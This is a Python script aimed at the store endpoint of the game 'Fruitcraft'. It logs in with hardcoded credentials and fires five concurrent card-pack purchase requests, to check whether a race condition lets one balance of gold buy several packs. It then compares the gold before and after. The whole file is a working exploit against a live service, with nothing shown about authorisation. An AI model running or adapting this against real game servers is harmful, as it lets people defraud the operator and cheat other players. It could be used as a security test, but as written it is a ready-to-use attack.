import sys, os
import json
import time
import threading
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "api")))
from fruitcraft_client import FruitClient

# A common bug in games is buying something multiple times concurrently 
# when you only have enough currency for one

def buy_pack(c, pack_id):
    res = c.post("/store/buycardpack", {"type": pack_id})
    print(res.get("status") if res else "Fail", end=" ")

def main():
    print("Testing Concurrent Purchases (Race Condition)...")
    c1 = FruitClient()
    s1, d1 = c1.login("fact11439memory24", "android_vuln_t1")
    if not s1: return
    
    print("Gold:", d1.get("data", {}).get("gold", 0))
    
    threads = []
    # Send 5 concurrent buy requests
    for i in range(5):
        t = threading.Thread(target=buy_pack, args=(c1, 1)) # pack 1 = 600 gold
        threads.append(t)
        t.start()
        
    for t in threads:
        t.join()

    print()
    d1 = c1.get_profile()
    print("Gold after:", d1.get("data", {}).get("gold", 0))

if __name__ == "__main__":
    main()
